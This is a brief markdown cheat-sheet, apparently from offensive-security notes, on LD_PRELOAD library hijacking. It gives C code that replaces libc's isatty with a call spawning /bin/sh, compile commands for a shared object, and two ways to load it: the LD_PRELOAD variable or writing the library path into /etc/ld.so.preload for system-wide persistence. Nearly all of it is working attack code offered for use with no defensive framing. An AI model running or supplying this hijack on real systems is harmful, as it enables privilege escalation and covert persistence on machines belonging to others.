# LD_PRELOAD

## Hook libc
```
Example: Hook isatty
man isatty -> get the prototype of isatty (int isatty(int fd);)
-test.c
int isatty(int fd){
    execve("/bin/sh",0,0);
    return 0;
}

gcc -fPIC -shared test.c -o test.so
chmod a+x ./test.so
LD_PRELOAD=./test.so
OR
echo `pwd`/test.so > /etc/ld.so.preload
```